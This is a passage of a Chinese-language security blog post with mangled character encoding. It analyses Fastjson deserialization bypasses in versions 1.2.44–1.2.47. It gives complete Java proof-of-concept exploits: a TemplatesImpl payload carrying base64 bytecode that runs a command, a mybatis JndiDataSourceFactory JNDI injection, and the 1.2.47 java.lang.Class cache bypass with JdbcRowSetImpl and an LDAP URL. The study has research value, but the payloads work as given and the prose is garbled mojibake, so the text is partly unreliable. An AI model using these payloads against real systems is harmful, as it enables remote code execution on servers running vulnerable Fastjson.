</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;[{,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>â€”â€”â€”â€”â€”â€”</p>
<h3 id="1244">1.2.44
</h3><p>åŒæ ·æ˜¯åœ¨checkAutoType()æ–¹æ³•ä¸­ï¼Œå¦‚ä¸‹é€»è¾‘ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413183713858.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413183713858"
	
	
></p>
<p>å‰ä¸€ä¸ªifæ˜¯åˆ¤æ–­æ˜¯å¦ä»¥<code>[</code>å¼€å¤´ï¼Œç¬¬äºŒä¸ªåº”è¯¥æ˜¯åˆ¤æ–­æœ€åæ˜¯å¦ä»¥<code>;</code>ç»“å°¾å§ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹å‡ºå°±æ˜¯ä¿®å¤äº†<code>[</code>çš„payloadï¼Œè¿‡æ»¤äº†æ•°ç»„å½¢å¼çš„payloadã€‚</p>
<h3 id="1245">1.2.45
</h3><p>è¿™ä¸ªç‰ˆæœ¬è¿˜å­˜åœ¨ä¸€ä¸ªé»‘åå•ç»•è¿‡ï¼Œä½†æ˜¯å…¶å®æ˜¯ä¸€ä¸ªç»„ä»¶æ¼æ´ï¼Œè¿™é‡Œåˆ©ç”¨åˆ°çš„æ˜¯mybatisç»„å»ºï¼Œéœ€è¦æ·»åŠ ä¾èµ–ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.mybatis<span class="nt">&lt;/groupId&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>mybatis<span class="nt">&lt;/artifactId&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.5.7<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨æ„ä¿®æ”¹fastjsonçš„ç‰ˆæœ¬ã€‚</p>
<p>å…¶å®è¿™ä¸ªæ¼æ´åŸºæœ¬çœ‹ä¸€ä¸‹payloadå°±æ‡‚äº†ï¼Œåˆ©ç”¨äº†ç»„ä»¶ï¼Œæ‰€ä»¥ç®—æ˜¯åˆ©ç”¨å¦å¤–çš„ç±»ï¼Œ<strong>åœ¨1.2.25 &lt;= fastjson &lt;= 1.2.45ç‰ˆæœ¬åªè¦æœ‰è¿™ä¸ªç»„ä»¶éƒ½èƒ½æ‰“</strong>ã€‚</p>
<p>POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;</span><span class="p">,</span><span class="s">&#34;properties&#34;</span><span class="p">:{</span><span class="s">&#34;data_source&#34;</span><span class="p">:</span><span class="s">&#34;rmi://127.0.0.1:1099/hello&#34;</span><span class="p">}}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹åº”ç±»çš„setteræ–¹æ³•æœ‰jndiæ¼æ´ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413184801164.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413184801164"
	
	
></p>
<p>æ‰€ä»¥æ„é€ äº†ç›´æ¥æ‰“å°±è¡Œäº†ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&#34;,\&#34;properties\&#34;:{\&#34;data_source\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;}}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œå¼¹å‡ºè®¡ç®—æœºï¼Œæ³¨æ„è¿˜æ˜¯éœ€è¦è®¾ç½®autoTypeSupportä¸ºtrueã€‚</p>
<h3 id="1247">1.2.47
</h3><p>è¿™ä¸ªç®—æ˜¯æ¯”è¾ƒé‡è¦çš„æ¼æ´ç‚¹äº†ï¼Œå¯ä»¥ä¸å¼€å§‹autoTypeSupportè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>å½±å“ç‰ˆæœ¬ï¼š1.2.25 &lt;= fastjson &lt;= 1.2.47</p>
<p>è¿™é‡Œè¿˜æ˜¯ä»1.2.47ç‰ˆæœ¬æ¥åˆ†æã€‚</p>
<p>è¿˜æ˜¯è·Ÿè¿›checkAutoType()æ–¹æ³•ï¼Œå…¶å®åœ¨è¿™ä¸ªç±»ä¸æ­¢æœ€åé‚£ä¸ªéœ€è¦autoTypeSupportä¸ºtrueæ‰èƒ½è¿”å›åŠ è½½åˆ°çš„clazzï¼Œå¦‚ä¸‹ä»£ç ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413191749197.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413191749197"
	
	
></p>
<p>è¿™é‡Œçš„expectClasså˜é‡é»˜è®¤ä¸ºnullï¼Œé‚£ä¹ˆåªè¦æˆ‘ä»¬èƒ½åœ¨TypeUtils.getClassFromMapping()æˆ–è€…deserializers.findClass()æ‰¾åˆ°æƒ³è¦åˆ©ç”¨çš„ç±»ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥åœ¨è¿™é‡Œè¿”å›åŠ è½½åˆ°çš„ç±»ã€‚</p>
<p>è·Ÿè¿›è¿™é‡Œçš„TypeUtils.getClassFromMapping()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413204423826.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413204423826"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ä»mappingä¸­å–å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªmappingsæ˜¯æ€ä¹ˆè¿›è¡Œå¤„ç†çš„å‘¢ï¼Œé‡æ–°è·Ÿäº†ä¸€éæµç¨‹ï¼Œæ²¡çœ‹åˆ°æœ‰èµ‹å€¼çš„åœ°æ–¹ï¼Œé‚£ä¹ˆè‚¯å®šå°±æ˜¯TypeUtilsç±»çš„staticè¯­å¥åœ¨è¿›è¡Œå¤„ç†ï¼Œç¿»çœ‹äº†ä¸€ä¸‹è¿™ä¸ªç±»çš„staticè¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413211138729.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413211138729"
	
	
></p>
<p>è·Ÿè¿›è¿™ä¸ªaddBaseClassMappings()æ–¹æ³•ï¼Œé‡Œé¢åŠ è½½äº†å¾ˆå¤šç±»ï¼ˆä¸‹å›¾åªæ˜¯éƒ¨åˆ†ï¼‰ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413211258883.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413211258883"
	
	
></p>
<p>ä¼¼ä¹ä¸å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†å»çœ‹deserializers.findClass()è·å–ç±»çš„æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413213142632.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413213142632"
	
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæƒ³è¦è¿”å›clazzçš„è¯æœ‰ä¸€å®šæ¡ä»¶ï¼Œå¹¶ä¸”è¿™é‡Œæ˜¯ä¸IdentityHashMapç±»çš„bucketså˜é‡æœ‰å…³ï¼Œç„¶åçœ‹è¿™é‡Œçš„æ¡ä»¶ï¼Œéœ€è¦keyä¸ºClasså±æ€§ã€‚é‚£ä¹ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™é‡Œdeserializerså˜é‡çš„èµ‹å€¼é€»è¾‘ï¼Œè¿™é‡Œè‚¯å®šå°±æ˜¯ä¸ParserConfigç±»æœ‰å…³äº†ï¼Œè¿™ä¸ªä¹Ÿæ˜¯ä¹‹å‰è¯´çš„å½¢å‚ä¼ é€’çš„ç±»å˜é‡ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413214851563.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413214851563"
	
	
></p>
<p>è°ƒç”¨çš„æ–¹æ³•ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413214914738.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413214914738"
	
	
></p>
<p>è¿™æ¬¡å°±éœ€è¦è·Ÿè¿›ParserConfigç±»çš„æ„é€ å‡½æ•°äº†ï¼Œä»–çš„æ„é€ å‡½æ•°è°ƒç”¨äº†initDeserializers()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413215143233.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413215143233"
	
	
></p>
<p>é‡Œé¢è°ƒç”¨äº†å¾ˆå¤šæ–¹æ³•ï¼Œæ³¨æ„å›¾ä¸­ï¼Œæ˜¯æ”¾å…¥äº†ä¸€ä¸ªClass.classçš„é”®ï¼Œçœ‹è¿™ä¸ªå¯¹åº”çš„ç±»ï¼Œä¹‹ç±»å°±æ˜¯è·å–åˆ°è¿™ä¸ªç±»ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221119366.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413221119366"
	
	
></p>
<p>è€Œè¿™ä¸ªç±»çš„deserialze()æ–¹æ³•å­˜åœ¨ä¸€ä¸ªå­˜åœ¨ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221259065.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413221259065"
	
	
></p>
<p>è¿™é‡Œä¼šè°ƒç”¨loadClass()æ–¹æ³•ï¼Œå°±æ˜¯æˆ‘ä»¬ä¹‹å‰ç†ŸçŸ¥çš„æ–¹æ³•ï¼Œåœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413225515367.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413225515367"
	
	
></p>
<p>è¿™é‡Œçš„cacheé»˜è®¤æ˜¯trueï¼Œæ‰€ä»¥è¿™é‡Œä¼šå°†å¯¹åº”çš„classNameæ”¾è¿›mappingsï¼Œå¹¶ä¸”è¿™é‡Œçš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œä»å‚æ•°ä¼ é€’æ¥çœ‹ï¼Œè¿™é‡Œçš„classNameå°±æ˜¯å‰é¢çš„strValå˜é‡ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221458695.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413221458695"
	
	
></p>
<p>è€ŒsetValå˜é‡æ˜¯ç”±objValå˜é‡è½¬æ¢æ¥çš„ï¼ŒobjValåˆæ˜¯ä»jsonå­—ç¬¦ä¸²è§£ææ¥çš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221607262.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413221607262"
	
	
></p>
<p>æ˜¯ä¸æ˜¯çœ‹åˆ°è¿™é‡Œè¿˜æœ‰ç‚¹æ‡µï¼Œåˆ«æ€¥ï¼Œä¸ºä»€ä¹ˆè¿™é‡Œè¦æåˆ°deserialze()æ–¹æ³•å‘¢ï¼Œå½“æˆ‘ä»¬æ­£å¸¸ååºåˆ—åŒ–æ—¶ï¼ŒåŒæ—¶å…¶å®ä»å‰é¢çš„è°ƒè¯•è¿‡ç¨‹å¯ä»¥çŸ¥é“ï¼Œæ˜¯ä¼šè·å–deserializerå¹¶è°ƒç”¨å®ƒçš„deserialze()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413221927894.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413221927894"
	
	
></p>
<p>æ‰€ä»¥å¯¹åº”çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°è¯•ä¼ å…¥Class.classï¼Œä»è€Œè·å–åˆ°MiscCodecç±»å®ä¾‹ï¼Œä»è€Œè°ƒç”¨åˆ°å®ƒçš„deserialze()æ–¹æ³•ï¼Œä»è€Œå¾€mappingsä¸­æ”¾å…¥æƒ³è¦åˆ©ç”¨çš„ç±»ï¼Œä»è€Œåœ¨ç›´æ¥åœ¨åç»­ä¸­è·å¾—æƒ³è¦çš„ç±»ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413222531904.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413222531904"
	
	
></p>
<p>æ‰€ä»¥ç»¼ä¸Šä¸Šé¢çš„æ€è·¯ï¼Œéœ€è¦è°ƒç”¨ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ”¾è¿›æŒ‡å®šç±»ï¼Œä¸€æ¬¡åŠ è½½è§¦å‘ååºåˆ—åŒ–ï¼Œå¯ä»¥å°è¯•å¦‚ä¸‹æ„é€ ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;1\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;},\&#34;2\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:2333/fupanc\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34;}}\n&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œåå¼¹å‡ºè®¡ç®—æœºï¼Œæ³¨æ„æ˜¯æ‰“çš„jndiæ‰“æ³•ã€‚</p>
<p>è¿™é‡Œçš„ç»†èŠ‚å°±æ˜¯æ²¡æœ‰è®¾ç½®autoTypeSupportï¼Œé»˜è®¤ä¸ºfalseï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªåˆ¤æ–­é»‘åå•çš„å°±ä¸ä¼šè¿›å…¥ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413224421887.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413224421887"
	
	
></p>
<p>è€Œç¬¬äºŒä¸ªåˆ¤æ–­é»‘åå•çš„åœ°æ–¹ä¸ä¼šåˆ°è¾¾ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250413224459135.png"
	
	
	
	loading="lazy"
	
		alt="image-20250413224459135"
	
	
></p>
<p>ç›´æ¥åœ¨ä¸­é—´å°±æ‰¾åˆ°ç›´æ¥ç»“æŸäº†ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯payloadä¸­ç¬¬äºŒä¸ªå¯ä»¥é‚£æ ·è®¾ç½®çš„åŸå› ã€‚</p>
<p>TemplatesImplçš„æ‰“æ³•å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;1\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;},\&#34;2\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&#34;,\&#34;_name\&#34;:\&#34;fupanc\&#34;,\&#34;_bytecodes\&#34;:[\&#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\&#34;],\&#34;_class\&#34;:null,\&#34;_tfactory\&#34;:{},\&#34;_outputProperties\&#34;:{}}}\n&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">Feature</span><span class="p">.</span><span class="na">SupportNonPublicField</span><span class="p">);</span><span class="w">
